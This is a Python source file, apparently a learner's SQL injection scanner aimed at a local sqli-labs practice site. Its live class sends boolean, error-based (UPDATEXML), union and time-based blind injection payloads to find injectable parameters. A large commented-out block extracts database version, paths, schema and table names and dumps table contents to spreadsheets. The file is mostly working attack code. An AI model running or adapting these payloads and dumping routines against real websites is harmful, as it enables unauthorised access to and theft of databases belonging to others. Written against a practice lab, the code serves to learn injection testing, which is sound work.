# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201118 -*-


import requests
import sys
from time import sleep
from time import perf_counter
from userdata import Global_UserData
from inj_union import InjUnion

print('我被打印了_Scanner.py')

# 初始化全局参数
Global_XlsSavePath = Global_UserData['XlsSavePath']
Global_Headers = {'User-Agent': Global_UserData['User-Agent']}


class HTTP(object):
    content = None
    con_len = 0
    old_time = 0.0
    new_time = 0.0

    def GetSelf(self):
        return self

    def GET(self, Url: str):
        """
        函数：GET请求

        :param Url: URL统一资源定位器
        :return: 响应体长度
        """
        self.content = requests.get(Url)
        self.old_time = self.new_time
        self.new_time = perf_counter()
        self.con_len = int(self.content.headers['Content-Length']) \
            if 'Content-Length' in self.content.headers \
            else int(len(self.content.content))
        return self.con_len, self.content.status_code,

    pass


class UrlInjector(HTTP):
    body_len = 0

    def Print(self, text):
        self._lock.acquire()
        print(f'>>{self._threadname}：{text}')
        self._lock.release()
        pass

    def CheckInj(self):
        """
        函数：检查该站点是否存在注入

        :return: T/F=是否存在注入点
        """

        sleep(0.1)
        for url_end in Global_UserData['inj_type']:
            url = self._url % url_end + ' and 0 --+'
            newlen, code = self.GET(url)
            self.Print(f'{code=},{newlen=},{self.body_len=}【{url}】')
            if newlen != self.body_len:
                # 判断注入方式是否在字典中
                if '注入方式' not in self._inj_info:
                    self._inj_info['注入方式'] = {}

                # 判断类型注入
                if '基于类型注入' not in self._inj_info['注入方式']:
                    self._url_end = url_end
                    self._inj_info['注入方式']['基于类型注入'] = self._url % url_end

                # 判断报错注入
                url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
                newlen, code = super().GET(url)
                if newlen > 0 and "错误注入" not in self._inj_info and \
                        "XPATH syntax error" in self.content.text:
                    self._inj_info['注入方式']['基于报错注入'] = self._url % url_end
            pass

        # 闭合循环完毕，判断联合注入
        if self._url_end is not None:
            url0 = self._url % self._url_end + ' union SELECT %s --+'
            sql_code = ''
            for i in range(1, 10):
                sql_code += f'{i},'
                url = url0 % sql_code[:-1]
                newlen, code = self.GET(url)
                self.Print(f'{code=},{newlen=},{i}【{url}】')
                if newlen == self.body_len:
                    self._inj_info['注入方式']['基于联合注入'] = i
                    break
            pass

        # 判断时间盲注
        newlen, code = self.GET(self._url % '1')
        self.Print(f"{code=},{newlen=},{self.new_time}【{self._url % '1'}】")
        for url_end in Global_UserData['inj_type']:
            # 循环构造 注入点
            url = self._url % url_end + ' and if(1,sleep(1),0)--+'

            # 查询新时间
            newlen, code = self.GET(url)
            print(f'{code=},{newlen=},{self.new_time}【{url}】')

            # 如果时间相减毫秒数＞900
            if (self.new_time - self.old_time) * 1000 > 900:
                self._inj_info['注入方式']['基于时间盲注'] = self._url % url_end
                break

        # 保存结果
        self._lock.acquire()
        print(self._url, self._inj_info)
        Global_UserData['result'][self._url] = self._inj_info.copy()
        self._lock.release()
        pass

    def __init__(self, Lock, ThreadName, Url):

        self._lock = Lock
        self._threadname = ThreadName
        self._url = Url
        # if 'Less-1' not in Url:
        #     return

        self.Print(f'扫描器传入 {Url=}')

        self.url = Url
        self.body_len, code = self.GET(Url % '1')
        self.Print(f'初始化Len {self.body_len}')
        if not self.body_len > 0:
            self.Print(f'无法注入，请检查该网页是否正常【{Url % "1"}】')
            return
        # self._InjUnion = InjUnion
        self._inj_info = {}
        self._url_end = None
        self.CheckInj()
        pass

    pass

# class UrlInjector(object):
#     _url_info = None
#
#     def __init__(self, Url):
#         """初始化注入类的信息"""
#         content = requests.get(url=Url % 1, headers=Global_Headers)
#         print(f'>初始化网址 {Url % 1} {content.status_code}', end=' ')
#         if content.status_code != 200:
#             print("初始化失败！！ERROR")
#             return
#         self.url = Url
#         self.body_len = int(content.headers['Content-Length']) \
#             if 'Content-Length' in content.headers \
#             else int(len(content.content))
#         print(f'初始化Len {self.body_len}')
#         self._type = Global_UserData['inj_type']
#         self._url_info = {}
#         pass
#
#     def PublicCheck(self):
#         # 如果初始化网页失败，则返回
#         if self._url_info is None:
#             return False
#
#         # 构造是否有注入点的返回值
#         bool_is_have = False
#
#         # 循环测试闭合点
#         for url_end in self._type:
#             url = self.url % url_end + ' and 0 --+错误注入'
#             print("【" + url, end="】")
#
#             # 测试链接，并得到返回长度
#             content = requests.get(url=url, headers=Global_Headers)
#             body_len = int(content.headers['Content-Length']) \
#                 if 'Content-Length' in content.headers \
#                 else int(len(content.content))
#             print("\t【这是网页原文", content.status_code, body_len)
#
#             # 判断网页是否和初始化时的长度一样
#             # 不一致则表示注入成功了
#             if body_len != self.body_len:
#                 print(content.text.replace('\r\n', ''),
#                       end="\t】原文结束\n\n")
#                 if "类型注入" not in self._url_info:
#                     self._url_info["类型注入"] = self.url % url_end
#                     bool_is_have = True
#                     pass
#                 url = self.url % url_end + ' and UPDATEXML(0,concat(char(126)),0)--+'
#                 content = requests.get(url=url, headers=Global_Headers)
#                 if "XPATH syntax error" in content.text and \
#                         "错误注入" not in self._url_info:
#                     self._url_info['错误注入'] = self.url % url_end
#                     bool_is_have = True
#                     break
#             pass
#         pass
#         return bool_is_have
#
#     def Print(self):
#         """
#         函数 : 打印网页注入信息
#
#         :return: 返回是否有网页注入
#         """
#
#         # 打印头
#         print(f">开始输出注入类型：{len(self._url_info)}")
#         ret_payload = {}
#         if "错误注入" in self._url_info:
#             ret_payload["错误注入"] = self._url_info['错误注入']
#             pass
#
#         # 循环输出存在的注入类型
#         for info in self._url_info:
#             print(f'>>存在注入\t{info}\t【{self._url_info[info]}】')
#
#             # 构造返回的结果
#             if len(ret_payload) == 0:
#                 ret_payload[info] = self._url_info[info]
#         print('^^' + '-' * len(str(ret_payload)) + '\n')
#
#         # 返回注入信息，供漏洞利用
#         if len(ret_payload) == 0:
#             return None
#         return ret_payload
#         pass
#
#     # noinspection PyMethodMayBeStatic
#     def PublicExp(self, payload: dict, bPrintDict=True):
#         """
#         函数： 利用漏洞获取数据库信息
#
#         :param payload: 用于注入点的字典
#         :param bPrintDict: 用于标记是否格式化输出数据库信息
#         :return: 返回T/F,表示是否成功利用
#         """
#
#         # 如果不存在注入漏洞，则返回
#         if len(payload) == 0:
#             return False
#         mode = url0 = None
#         for x in payload:
#             mode, url0 = x, payload[x]
#         print(f'>开始漏洞利用\t{mode}【{url0}】')
#         if mode == '错误注入':
#             self._url_info['注入方式'] = mode
#
#             # 构造注入语句
#             url = url0
#
#             # 构造脱裤信息
#             if '脱裤_数据库信息' not in self._url_info:
#                 self._url_info['脱裤_数据库信息'] = {}
#             dict_sql = self._url_info['脱裤_数据库信息']
#             dict_sql['数据库版本'] = GetResult_ERROR(url, '@@VERSION')
#             dict_sql['数据库文件权限'] = GetResult_ERROR(url, '@@secure_file_priv')
#             dict_sql['数据库安装路径'] = GetResult_ERROR(url, '@@basedir')
#
#             dict_sql['系统数据库索引'] = GetResult_ERROR(
#                 url, 'SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata')
#             dict_sql['系统数据库总数'] = GetResult_ERROR(
#                 url, 'SELECT COUNT(*) FROM information_schema.schemata')
#             dict_sql['系统表格总数'] = GetResult_ERROR(
#                 url, 'SELECT COUNT(*) FROM information_schema.TABLES')
#
#             dict_sql['本数据库名'] = GetResult_ERROR(url, 'database()')
#             dict_sql['本表格总数'] = GetResult_ERROR(
#                 url, 'SELECT count(*) FROM information_schema.STATISTICS '
#                      'WHERE TABLE_SCHEMA=database()')
#             dict_sql['本表格索引'] = GetResult_ERROR(
#                 url, 'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
#                      'WHERE TABLE_SCHEMA=database()')
#
#             if '脱裤_数据库信息' in self._url_info and \
#                     '本表格索引' in dict_sql:
#                 print(f">需要脱裤\t{dict_sql['本表格索引']}")
#
#                 self._url_info['脱裤_数据库数据'] = {}
#                 SelectTables(
#                     url0,
#                     dict_sql['本数据库名'],
#                     dict_sql['本表格索引'],
#                     self._url_info['脱裤_数据库数据']
#                 )
#
#             if bPrintDict:
#                 pp.pprint(self._url_info)
#             return True
#         pass
#
#     def PublicSaveXlsx(self):
#         """
#         函数： 用于保存xlsx文件至目录
#
#         :return: T/F=是否保存成功
#         """
#
#         # 格式化文件名
#         _dict = self._url_info
#         if '注入方式' not in _dict:
#             return False
#         filepath = f"{Global_UserData['XlsSavePath']}" \
#                    f"{_dict['注入方式']}.xlsx"
#         SaveXlsx(filepath, self._url_info)
#         pass
#
#     pass
#
#
# def main():
#     g_url = 'http://127.0.0.1:8001/sqli/Less-{}/?id=%s'
#     inj = UrlInjector(g_url.format(1, '{}'))
#     if inj.PublicCheck():
#         if payload := inj.Print():
#             if inj.PublicExp(payload):
#                 # 利用成功，保存xlsx
#                 inj.PublicSaveXlsx()
#                 pass
#
#     pass
#
#
# if __name__ == '__main__':
#     main()
#     pass
